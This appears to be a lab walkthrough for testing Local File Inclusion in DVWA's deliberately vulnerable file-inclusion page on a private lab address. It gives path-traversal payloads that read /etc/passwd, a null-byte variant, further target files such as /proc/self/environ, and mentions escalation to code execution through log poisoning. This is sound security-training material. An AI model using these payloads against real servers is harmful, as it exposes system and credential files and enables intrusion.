# Local File Inclusion (LFI)

## 🎯 Objective
Test if the web application is vulnerable to **Local File Inclusion** by manipulating the file path to include local server files.

---

## 🧱 Target Info
- **Target IP:** 192.168.56.105  
- **Service:** HTTP (Port 80)  
- **App Used:** DVWA (File Inclusion Module)  
- **Tools:** Browser, Burp Suite (optional)

---

## 🧪 Steps

### 🔹 Step 1: Access the File Inclusion Page
Navigate to:
```
http://192.168.56.105/dvwa/vulnerabilities/fi/
```
Use **low security** level in DVWA.

---

### 🔹 Step 2: Attempt Basic LFI Payload  
Try changing the `page` parameter to include `/etc/passwd`:
```
http://192.168.56.105/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```
➡️ If the file contents appear, the app is vulnerable to LFI.

---

### 🔹 Step 3: Test with Null Byte Injection (for old PHP versions)
Some older systems may need a null byte:
```
?page=../../../../etc/passwd%00
```

---

### 🔹 Step 4: Use Burp Suite for Testing
Use Burp to:
- Intercept the request
- Send to Repeater
- Test deeper traversal like:
```
?page=../../../../../../../../etc/passwd
```

---

## 🧠 Notes
- You can include other local files such as:
  - `/proc/self/environ`
  - `../../../../../../windows/win.ini` (on Windows)
- Combine with **RCE** via log poisoning or PHP session tricks.

---

## ✅ Conclusion
```
The application includes files from user input without validation, making it vulnerable to LFI.  
Attackers can read sensitive files, and in advanced cases, achieve **Remote Code Execution** (RCE).
```
